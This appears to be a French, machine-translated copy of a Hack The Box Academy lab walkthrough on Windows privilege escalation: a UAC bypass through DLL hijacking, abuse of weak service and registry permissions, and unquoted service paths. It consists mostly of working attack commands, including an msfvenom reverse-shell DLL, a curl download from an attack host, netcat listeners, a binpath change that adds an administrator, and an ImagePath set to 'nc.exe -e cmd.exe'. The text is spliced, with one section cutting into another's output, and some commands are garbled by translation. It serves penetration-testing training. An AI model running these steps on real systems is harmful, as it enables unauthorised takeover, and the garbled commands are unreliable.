Contrôle de compte d'utilisateur
====================

* * * * *

[Contrôle de compte d'utilisateur (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui active une invite de consentement pour les activités élevées. Les applications ont différents niveaux d'"intégrité" et un programme avec un niveau élevé peut effectuer des tâches susceptibles de compromettre le système. Lorsque l'UAC est activé, les applications et les tâches s'exécutent toujours dans le contexte de sécurité d'un compte non administrateur, sauf si un administrateur autorise explicitement ces applications/tâches à avoir un accès de niveau administrateur au système à exécuter. Il s'agit d'une fonctionnalité pratique qui protège les administrateurs contre les modifications involontaires, mais qui n'est pas considérée comme une limite de sécurité.

Lorsque l'UAC est en place, un utilisateur peut se connecter à son système avec son compte d'utilisateur standard. Lorsque les processus sont lancés à l'aide d'un jeton d'utilisateur standard, ils peuvent effectuer des tâches en utilisant les droits accordés à un utilisateur standard. Certaines applications nécessitent des autorisations supplémentaires pour s'exécuter, et UAC peut fournir des droits d'accès supplémentaires au jeton pour qu'elles s'exécutent correctement.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explique en détail le fonctionnement de l'UAC et inclut le processus de connexion, l'expérience utilisateur et l'architecture UAC. Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le fonctionnement de l'UAC spécifique à leur organisation au niveau local (à l'aide de secpol.msc), ou configuré et diffusé via des objets de stratégie de groupe (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont discutés en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings ). Il existe 10 paramètres de stratégie de groupe qui peuvent être définis pour UAC. Le tableau suivant fournit des détails supplémentaires :

| Paramètre de stratégie de groupe | Clé de registre | Paramètre par défaut |
| --- | --- | --- |
| [Contrôle de compte d'utilisateur : mode d'approbation administrateur pour le compte administrateur intégré] (https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control -group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account) | FilterAdministratorToken | Désactivé |
| [Contrôle de compte d'utilisateur : autoriser les applications UIAccess à demander une élévation sans utiliser le bureau sécurisé] (https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account -control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | ActiverUIADesktopToggle | Désactivé |
| [Contrôle de compte d'utilisateur : comportement de l'invite d'élévation pour les administrateurs en mode d'approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account- control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode) | ConsentPromptBehaviorAdmin | Invite de consentement pour les binaires non-Windows |
| [Contrôle de compte d'utilisateur : comportement de l'invite d'élévation pour les utilisateurs standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group -policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users) | ConsentPromptBehaviorUser | Demande d'informations d'identification sur le bureau sécurisé |
| [Contrôle de compte d'utilisateur : détecter les installations d'applications et demander une élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group- policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation) | EnableInstallerDetection | Activé (par défaut pour la maison) Désactivé (par défaut pour l'entreprise) |
| [Contrôle de compte d'utilisateur : élever uniquement les exécutables signés et validés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group -policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated) | ValiderAdminCodeSignatures | Désactivé |
| [Contrôle de compte d'utilisateur : élever uniquement les applications UIAccess installées dans des emplacements sécurisés] (https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control -group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations) | ActiverSecureUIAPaths | Activé |
| [Contrôle de compte d'utilisateur : exécuter tous les administrateurs en mode d'approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group- policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode) | ActiverLUA | Activé |
| [Contrôle de compte d'utilisateur : basculez vers le bureau sécurisé lorsque vous demandez une élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control- groupe-politique-et-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation) | PromptOnSecureDesktop | Activé |
| [Contrôle de compte d'utilisateur : virtualiser les échecs d'écriture de fichiers et de registre dans des emplacements par utilisateur] (https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account- control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations) | Activer la virtualisation | Activé |

[Source](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings)

![image](https://academy.hackthebox.com/storage/modules/67/uac.png)

L'UAC doit être activé, et bien qu'il n'empêche pas un attaquant d'obtenir des privilèges, c'est une étape supplémentaire qui peut ralentir ce processus et le forcer à devenir plus bruyant.

Le compte `administrateur RID 500 par défaut` fonctionne toujours au niveau obligatoire élevé. Lorsque le mode d'approbation administrateur (AAM) est activé, tous les nouveaux comptes d'administrateur que nous créons fonctionneront au niveau obligatoire moyen par défaut et se verront attribuer deux jetons d'accès distincts lors de la connexion. Dans l'exemple ci-dessous, le compte d'utilisateur `sarah` est dans les administrateurs groupe, mais cmd.exe s'exécute actuellement dans le contexte de leur jeton d'accès non privilégié.

#### Vérification de l'utilisateur actuel

Vérification de l'utilisateur actuel

```
C:\htb> whoami /utilisateur

INFORMATIONS DE L'UTILISATEUR
----------------

ID du nom d'utilisateur
================= ================================= =============
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002

```

#### Confirmation de l'appartenance au groupe d'administrateurs

Confirmation de l'appartenance au groupe d'administrateurs

```
C:\htb> administrateurs du groupe local net

Administrateurs de noms d'alias
Commentaire Les administrateurs ont un accès complet et illimité à l'ordinateur/au domaine

Membres

-------------------------------------------------- -----------------------------
Administrateur
mrb3n
sarah
La commande s'est terminée avec succès.

```

#### Examen des privilèges de l'utilisateur

Examen des privilèges de l'utilisateur

```
C:\htb> whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
================================================= =============== ========
SeShutdownPrivilege Arrêter le système Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeUndockPrivilege Supprimer l'ordinateur de la station d'accueil Désactivé
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé
SeTimeZonePrivilege Changer le fuseau horaire Désactivé

```

#### Confirmation de l'activation de l'UAC

Il n'y a pas de version en ligne de commande de l'invite de consentement de l'interface graphique, nous devrons donc contourner l'UAC pour exécuter des commandes avec notre jeton d'accès privilégié. Tout d'abord, vérifions si l'UAC est activé et, si oui, à quel niveau.

Confirmation de l'activation de l'UAC

```
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
     ActiverLUA REG_DWORD 0x1

```

#### Vérification du niveau UAC

Vérification du niveau UAC

```
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
     ConsentPromptBehaviorAdmin REG_DWORD 0x5

```

La valeur de `ConsentPromptBehaviorAdmin` est `0x5`, ce qui signifie que le niveau UAC le plus élevé de `Toujours notifier` est activé. Il y a moins de contournements UAC à ce niveau le plus élevé.

#### Vérification de la version de Windows

L'UAC contourne les failles de levier ou les fonctionnalités involontaires dans différentes versions de Windows. Examinons la version de Windows que nous cherchons à élever.

Vérification de la version de Windows

```
PS C:\htb> [environnement] ::OSVersion.Version

Révision de construction mineure majeure
----- ----- ----- --------
10 0 14393 0

```

Cela renvoie la version de build 14393, qui, à l'aide de [cette](https://en.wikipedia.org/wiki/Windows_10_version_history) page, nous renvoie à la version `1607` de Windows.

![image](https://academy.hackthebox.com/storage/modules/67/build.png)

Le projet [UACME](https://github.com/hfiref0x/UACME) maintient une liste des contournements UAC, y compris des informations sur le numéro de build Windows concerné, la technique utilisée et si Microsoft a publié une mise à jour de sécurité pour y remédier. Utilisons la technique numéro 54, qui est censée fonctionner à partir de Windows 10 build 14393. Cette technique cible la version 32 bits du binaire à élévation automatique `SystemPropertiesAdvanced.exe`. Il existe de nombreux fichiers binaires de confiance que Windows permettra d'élever automatiquement sansNous avons besoin d'une invite de consentement UAC.

Selon [ce](https://egre55.github.io/system-properties-uac-bypass) article de blog, la version 32 bits de `SystemPropertiesAdvanced.exe` tente de charger la DLL inexistante srrstr.dll, qui est utilisé par la fonctionnalité de restauration du système.

Lors de la tentative de localisation d'une DLL, Windows utilisera l'ordre de recherche suivant.

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système `C:\Windows\System32` pour les systèmes 64 bits.
3. Le répertoire système 16 bits `C:\Windows\System` (non pris en charge sur les systèmes 64 bits)
4. Le répertoire Windows.
5. Tous les répertoires répertoriés dans la variable d'environnement PATH.

#### Examen de la variable de chemin

Examinons la variable de chemin à l'aide de la commande `cmd /c echo %PATH%`. Cela révèle les dossiers par défaut ci-dessous. Le dossier `WindowsApps` se trouve dans le profil de l'utilisateur et peut être modifié par l'utilisateur.

Examen de la variable de chemin

```
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32 ;
C:\Windows ;
C:\Windows\System32\Wbem ;
C:\Windows\System32\WindowsPowerShell\v1.0\ ;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps ;

```

Nous pouvons potentiellement contourner l'UAC en utilisant le piratage de DLL en plaçant une DLL `srrstr.dll` malveillante dans le dossier `WindowsApps` , qui sera chargée dans un contexte élevé.

#### Génération d'une DLL srrstr.dll malveillante

Tout d'abord, générons une DLL pour exécuter un reverse shell.

Génération d'une DLL srrstr.dll malveillante

```
dsgsec@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Windows à partir de la charge utile
[-] Aucune arche sélectionnée, sélection de l'arche : x86 à partir de la charge utile
Aucun encodeur spécifié, sortie de données utiles brutes
Taille de la charge utile : 324 octets
Taille finale du fichier dll : 5120 octets

```

Remarque : Dans l'exemple ci-dessus, nous avons spécifié notre adresse IP VPN tun0.

#### Démarrage du serveur HTTP Python sur l'hôte d'attaque

Copiez la DLL générée dans un dossier et configurez un mini serveur Web Python pour l'héberger.

Démarrage du serveur HTTP Python sur l'hôte d'attaque

```
dsgsec@htb[/htb]$ sudo python3 -m http.serveur 8080

```

#### Téléchargement de la cible DLL

Téléchargez la DLL malveillante sur le système cible et installez un écouteur `Netcat` sur notre machine d'attaque.

Téléchargement de la cible DLL

```
PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

```

#### Démarrage de l'écouteur nc sur l'hôte d'attaque

Démarrage de nc Listener sur l'hôte d'attaque

```
dsgsec@htb[/htb]$ nc -lvnp 8443

```

#### Test de connexion

Si nous exécutons le fichier `srrstr.dll` malveillant, nous recevrons un shell indiquant les droits d'utilisateur normaux (UAC activé). Pour tester cela, nous pouvons exécuter la DLL à l'aide de `rundll32.exe` pour obtenir une connexion shell inversée.

Tester la connexion

```
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll

```

Une fois la connexion rétablie, nous verrons les droits d'utilisateur normaux.

Tester la connexion

```
dsgsec@htb[/htb]$ nc -lnvp 8443

écoute sur [tout] 8443 ...

se connecter à [10.10.14.3] depuis (INCONNU) [10.129.43.16] 49789
Microsoft Windows [Version 10.0.14393]
(c) Microsoft Corporation 2016. Tous les droits sont réservés.

C:\Users\sarah> whoami /priv

whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
================================================= =============== ========
SeShutdownPrivilege Arrêter le système Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeUndockPrivilege Supprimer l'ordinateur de la station d'accueil Désactivé
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé
SeTimeZonePrivilege Changer le fuseau horaire Désactivé

```

#### Exécution de SystemPropertiesAdvanced.exe sur l'hôte cible

Maintenant, nous pouvons exécuter la version 32 bits de `SystemPropertiesAdvanced.exe` à partir de l'hôte cible.

Exécution de SystemPropertiesAdvanced.exe sur l'hôte cible

```
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

```

#### Réception de la connexion Retour

En revenant sur notre auditeur, nous devrions recevoir une connexion presque instantanément.

Réception de la connexion Retour

```
dsgsec@htb[/htb]$ nc -lvnp 8443

écoute sur [tout] 8443 ...
se connecter à [10.10.14.3] depuis (INCONNU) [10.129.43.16] 50273
Microsoft Windows [Version 10.0.14393]
(c) Microsoft Corporation 2016. Tous les droits sont réservés.

C:\Windows\system32>whoami

qui suis je
winlpe-ws03\sarah

C:\Windows\system32>whoami /priv

whoami /priv
INFORMATIONS SUR LES PRIVILÈGES
----------------------
Nom du privilège Description État
======================================== ========= ================================================= ======= ========
SeIncreaseQuotaPrivilege Adjust memorWeak Permissions
================

* * * * *

Les autorisations sur les systèmes Windows sont compliquées et difficiles à obtenir correctement. Un léger modification à un endroit peut introduire un défaut ailleurs. En tant que testeurs d'intrusion, nous devons comprendre le fonctionnement des autorisations dans Windows et les différentes manières dont les erreurs de configuration peuvent être exploitées pour élever les privilèges. Les failles liées aux autorisations abordées dans cette section sont relativement rares dans les applications logicielles proposées par les grands fournisseurs (mais sont observées de temps en temps), mais sont courantes dans les logiciels tiers de petits fournisseurs, les logiciels open source et les applications personnalisées. Les services s'installent généralement avec les privilèges SYSTEM, donc l'exploitation d'une faille liée aux autorisations de service peut souvent conduire à un contrôle complet sur le système cible. Quel que soit l'environnement, nous devons toujours vérifier les autorisations faibles et pouvoir le faire à la fois à l'aide d'outils et manuellement au cas où nous ne disposerions pas de nos outils facilement disponibles.

* * * * *

ACL permissives du système de fichiers
---------------------------

#### Exécution de SharpUp

Nous pouvons utiliser [SharpUp](https://github.com/GhostPack/SharpUp/) de la suite d'outils GhostPack pour vérifier les fichiers binaires de service souffrant d'ACL faibles.

Exécution de SharpUp

```
PS C:\htb> .\SharpUp.exe audit

=== SharpUp : Exécuter des vérifications d'escalade de privilèges ===

=== Fichiers binaires de service modifiables ===

   Nom : SecurityService
   Nom d'affichage : Service de gestion de la sécurité PC
   Description : Responsable de la gestion de la sécurité des PC
   Etat : Arrêté
   Mode de démarrage : Auto
   Nom du chemin : "C:\Program Files (x86)\PCProtect\SecurityService.exe"

   <SNIP>

```

L'outil identifie le `PC Security Management Service`, qui exécute le binaire `SecurityService.exe` au démarrage.

#### Vérification des autorisations avec icacls

À l'aide [icacls](https://ss64.com/nt/icacls.html) nous pouvons vérifier la vulnérabilité et voir que les groupes `EVERYONE` et `BUILTIN\Users` ont reçu des autorisations complètes sur le répertoire, et donc tout un utilisateur système non privilégié peut manipuler le répertoire et son contenu.

Vérification des autorisations avec icacls

```
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users :(I)(F)
                                                      Tout le monde :(I)(F)
                                                      AUTORITÉ NT\SYSTÈME :(I)(F)
                                                      INTÉGRÉ\Administrateurs :(I)(F)
                                                      AUTORITÉ DU PACKAGE D'APPLICATION\TOUS LES PACKAGES D'APPLICATION :(I)(RX)
                                                      AUTORITÉ DU PACKAGE D'APPLICATION\TOUS LES PACKAGES D'APPLICATION RESTREINTS :(I)(RX)

Traitement réussi de 1 fichiers ; Échec du traitement de 0 fichiers

```

#### Remplacement du binaire du service

Ce service peut également être démarré par des utilisateurs non privilégiés, nous pouvons donc faire une sauvegarde du binaire d'origine et le remplacer par un binaire malveillant généré avec `msfvenom`. Il peut nous donner un shell inversé en tant que `SYSTEM`, ou ajouter un utilisateur administrateur local et nous donner un contrôle administratif total sur la machine.

Remplacement du binaire de service

```
C:\htb> cmd /c copie /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService

```

* * * * *

Autorisations de service faibles
------------------------

#### Revoir SharpUp à nouveau

Vérifions à nouveau la sortie `SharpUp` pour tous les services modifiables. Nous constatons que `WindscribeService` est potentiellement mal configuré.

Revoir SharpUp à nouveau

```
C:\htb> Audit SharpUp.exe

=== SharpUp : Exécuter des vérifications d'escalade de privilèges ===

=== Services modifiables ===

   Nom : WindscribeService
   Nom d'affichage : WindscribeService
   Description : Gère le pare-feu et contrôle le tunnel VPN
   Etat : En cours d'exécution
   Mode de démarrage : Auto
   Nom du chemin : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

```

#### Vérification des autorisations avec AccessChk

Ensuite, nous utiliserons [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) de la suite Sysinternals pour énumérer les autorisations sur le service. Les indicateurs que nous utilisons, dans l'ordre, sont `-q` (omettre la bannière), `-u` (supprimer les erreurs), `-v` (verbeux), `-c` (spécifier le nom d'un service Windows) et ` -w` (afficher uniquement les objets disposant d'un accès en écriture). Ici, nous pouvons voir que tous les utilisateurs authentifiés ont [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) droits sur le service, ce qui signifie contrôle total en lecture/écriture sur celui-ci.

Vérification des autorisations avec AccessChk

```
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService

Accesschk v6.13 - Signale les autorisations effectives pour les objets sécurisables
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

WindscribeService
   Niveau obligatoire moyen (par défaut) [Pas de rédaction]
   RW NT AUTORITY\SYSTEM
         SERVICE_ALL_ACCESS
   RW BUILTIN\Administrateurs
         SERVICE_ALL_ACCESS
   RW NT AUTHORITY\Utilisateurs authentifiés
         SERVICE_ALL_ACCESS

```

#### Vérifiez l'administrateur localn Groupe

La vérification du groupe d'administrateurs locaux confirme que notre utilisateur `htb-student` n'est pas membre.

Vérifier le groupe d'administrateurs locaux

```
C:\htb> administrateurs du groupe local net

Administrateurs de noms d'alias
Commentaire Les administrateurs ont un accès complet et illimité à l'ordinateur/au domaine

Membres

-------------------------------------------------- -----------------------------
Administrateur
mrb3n
La commande s'est terminée avec succès.

```

#### Modification du chemin binaire du service

Nous pouvons utiliser nos autorisations pour modifier le chemin binaire de manière malveillante. Modifions-le pour ajouter notre utilisateur au groupe d'administrateurs locaux. Nous pourrions définir le chemin binaire pour exécuter n'importe quelle commande ou exécutable de notre choix (comme un binaire shell inversé).

Modification du chemin binaire du service

```
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] RÉUSSITE de ChangeServiceConfig

```

#### Arrêt du service

Ensuite, nous devons arrêter le service, afin que la nouvelle commande `binpath` s'exécute au prochain démarrage.

Arrêt du service

```
C:\htb> sc stop WindscribeService

SERVICE_NAME : service Windscribe
         TYPE : 10 WIN32_OWN_PROCESS
         ÉTAT : 3 STOP_PENDING
                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
         WIN32_EXIT_CODE : 0 (0x0)
         SERVICE_EXIT_CODE : 0 (0x0)
         POINT DE CONTRÔLE : 0x4
         WAIT_HINT : 0x0

```

#### Démarrage du service

Puisque nous avons un contrôle total sur le service, nous pouvons le redémarrer, et la commande que nous avons placée dans `binpath` s'exécutera même si un message d'erreur est renvoyé. Le service ne démarre pas car le `binpath` ne pointe pas vers l'exécutable du service réel. Néanmoins, l'exécutable s'exécutera lorsque le système tentera de démarrer le service avant de se tromper et d'arrêter à nouveau le service, en exécutant la commande que nous spécifions dans le `binpath`.

Démarrage du service

```
C:\htb> sc démarrer WindscribeService

[SC] ÉCHEC du service de démarrage 1053 :

Le service n'a pas répondu à la demande de démarrage ou de contrôle en temps opportun.

```

#### Confirmation de l'ajout du groupe d'administrateurs locaux

Enfin, vérifiez pour confirmer que notre utilisateur a été ajouté au groupe des administrateurs locaux.

Confirmation de l'ajout du groupe d'administrateurs locaux

```
C:\htb> administrateurs du groupe local net

Administrateurs de noms d'alias
Commentaire Les administrateurs ont un accès complet et illimité à l'ordinateur/au domaine

Membres

-------------------------------------------------- -----------------------------
Administrateur
htb-étudiant
mrb3n
La commande s'est terminée avec succès.

```

Un autre exemple notable est le [service d'orchestrateur de mise à jour (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works) de Windows, qui est responsable du téléchargement et installation des mises à jour du système d'exploitation. Il est considéré comme un service Windows essentiel et ne peut pas être supprimé. Puisqu'il est chargé d'apporter des modifications au système d'exploitation via l'installation de mises à jour de sécurité et de fonctionnalités, il s'exécute en tant que compte `NT AUTHORITY\SYSTEM` tout-puissant. Avant d'installer le correctif de sécurité relatif à [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), il était possible d'élever les privilèges d'un compte de service à `SYSTEM`. Cela était dû à des autorisations faibles, qui permettaient aux comptes de service de modifier le chemin binaire du service et de démarrer/arrêter le service.

* * * * *

Autorisations de service faibles - Nettoyage
----------------------------------

Nous pouvons nettoyer après nous-mêmes et nous assurer que le service fonctionne correctement en l'arrêtant et en réinitialisant le chemin binaire vers l'exécutable du service d'origine.

#### Inverser le chemin binaire

Inverser le chemin binaire

```
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

[SC] RÉUSSITE de ChangeServiceConfig

```

#### Redémarrer le service

Si tout se passe comme prévu, nous pouvons recommencer le service sans problème.

Redémarrer le service

```
C:\htb> sc démarrer WindScribeService

SERVICE_NAME : service WindScribe
         TYPE : 10 WIN32_OWN_PROCESS
         ÉTAT : 2 START_PENDING
                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
         WIN32_EXIT_CODE : 0 (0x0)
         SERVICE_EXIT_CODE : 0 (0x0)
         POINT DE CONTRÔLE : 0x0
         WAIT_HINT : 0x0
         NIP : 1716
         DRAPEAUX :

```

#### Vérification que le service est en cours d'exécution

L'interrogation du service montrera qu'il fonctionne à nouveau comme prévu.

Vérifier que le service est en cours d'exécution

```
C:\htb> sc requête WindScribeService

SERVICE_NAME : service WindScribe
         TYPE : 10 WIN32_OWN_PROCESS
         ÉTAT : 4 En cours d'exécution
                                 (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
         WIN32_EXIT_CODE : 0 (0x0)
         SERVICE_EXIT_CODE : 0 (0x0)
         POINT DE CONTRÔLE : 0x0
         WAIT_HINT : 0x0

```

* ** * *

Chemin de service non cité
---------------------

Lorsqu'un service est installé, la configuration du registre spécifie un chemin vers le binaire qui doit être exécuté au démarrage du service. Si ce binaire n'est pas encapsulé entre guillemets, Windows tentera de localiser le binaire dans différents dossiers. Prenez l'exemple de chemin binaire ci-dessous.

#### Chemin binaire du service

Chemin binaire du service

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

```

Windows décidera de la méthode d'exécution d'un programme en fonction de son extension de fichier, il n'est donc pas nécessaire de la spécifier. Windows tentera de charger les exécutables potentiels suivants dans l'ordre au démarrage du service, avec un .exe implicite :

- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

#### Service d'interrogation

Service d'interrogation

```
C:\htb> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig RÉUSSITE

SERVICE_NAME : service d'aide de l'explorateur système
         TYPE : 20 WIN32_SHARE_PROCESS
         START_TYPE : 2 AUTO_START
         ERROR_CONTROL : 0 IGNORER
         BINARY_PATH_NAME : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
         LOAD_ORDER_GROUP :
         MARQUE : 0
         DISPLAY_NAME : service de l'explorateur système
         DEPENDANCES :
         SERVICE_START_NAME : système local

```

Si nous pouvons créer les fichiers suivants, nous serions en mesure de détourner le fichier binaire du service et d'obtenir l'exécution de la commande dans le contexte du service, dans ce cas `NT AUTHORITY\SYSTEM`.

- `C:\Programme.exe\`
- `C:\Program Files (x86)\System.exe`

Cependant, la création de fichiers à la racine du lecteur ou du dossier des fichiers de programme nécessite des privilèges d'administration. Même si le système avait été mal configuré pour permettre cela, l'utilisateur ne serait probablement pas en mesure de redémarrer le service et dépendrait d'un redémarrage du système pour augmenter les privilèges. Bien qu'il ne soit pas rare de trouver des applications avec des chemins de service non cités, ce n'est pas souvent exploitable.

#### Recherche de chemins de service non cités

Nous pouvons identifier les chemins binaires de service sans guillemets à l'aide de la commande ci-dessous.

Recherche de chemins de service non cités

```
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
GVFS.Service GVFS.Service C:\Program Files\GVFS\GVFS.Service.exe Auto
Service de l'Explorateur système SystemExplorerHelpService C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe Auto
WindscribeService WindscribeService C:\Program Files (x86)\Windscribe\WindscribeService.exe Automatique

```

* * * * *

ACL de registre permissives
------------------------

Il vaut également la peine de rechercher les ACL de service faibles dans le registre Windows. Nous pouvons le faire en utilisant `accesschk`.

#### Vérification des ACL de service faibles dans le registre

Vérification des ACL de service faibles dans le registre

```
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Signale les autorisations effectives pour les objets sécurisables
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
         KEY_ALL_ACCESS

<SNIP>

```

#### Changer ImagePath avec PowerShell

Nous pouvons en abuser en utilisant l'applet de commande PowerShell `Set-ItemProperty` pour modifier la valeur `ImagePath` , à l'aide d'une commande telle que :

Changer ImagePath avec PowerShell

```
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443 "

```

* * * * *

Binaire d'exécution automatique du registre modifiable
----------------------------------

#### Vérifier les programmes de démarrage

Nous pouvons utiliser WMIC pour voir quels programmes s'exécutent au démarrage du système. Supposons que nous ayons des autorisations d'écriture dans le registre pour un binaire donné ou que nous puissions écraser un binaire répertorié. Dans ce cas, nous pourrons peut-être élever les privilèges à un autre utilisateur la prochaine fois que l'utilisateur se connectera.

Vérifier les programmes de démarrage

```
PS C:\htb> Get-CimInstance Win32_StartupCommand | sélectionnez le nom, la commande, l'emplacement, l'utilisateur |fl

Nom : One Drive
commande : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Emplacement : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Utilisateur : WINLPE-WS01\mrb3n

Nom : Windscribe
commande : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Emplacement : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Utilisateur : WINLPE-WS01\mrb3n

Nom : SecurityHealth
commande : %windir%\system32\SecurityHealthSystray.exe
Emplacement : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Utilisateur : Publique

Nom : Processus utilisateur VMware
commande : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Emplacement : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Utilisateur : Publique

Nom : Processus VMware VM3DService
commande : "C:\WINDOWS\system32\vm3dservice.exe" -u
Emplacement : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Utilisateur : Publique

```

Ce [post](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries) et [ce site](https://www.microsoftpressstore.com /articles/article.aspx?p=2762082&seqNum=2) détaillent de nombreux emplacements d'exécution automatique potentiels sur les systèmes Windows. y quotas pour un processus désactivé
SeSecurityPrivilege Gérer le journal d'audit et de sécurité Désactivé
SeTakeOwnershipPrivilege S'approprier des fichiers ou d'autres objets Désactivé
SeLoadDriverPrivilege Charger et décharger les pilotes de périphérique Désactivé
Performances système du profil SeSystemProfilePrivilege Désactivé
SeSystemtimePrivilege Modifier l'heure du système Désactivé
Processus unique du profil SeProfileSingleProcessPrivilege Désactivé
SeIncreaseBasePriorityPrivilege Augmenter la priorité de planification Désactivé
SeCreatePagefilePrivilege Créer un fichier d'échange Désactivé
SeBackupPrivilege Sauvegarder des fichiers et des répertoires Désactivé
SeRestorePrivilege Restaurer les fichiers et les répertoires Désactivé
SeShutdownPrivilege Arrêter le système Désactivé
Programmes de débogage SeDebugPrivilege désactivés
SeSystemEnvironmentPrivilege Modifier les valeurs de l'environnement du micrologiciel Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeRemoteShutdownPrivilege Forcer l'arrêt à partir d'un système distant Désactivé
SeUndockPrivilege Supprimer l'ordinateur de la station d'accueil Désactivé
SeManageVolumePrivilege Effectuer des tâches de maintenance de volume Désactivé
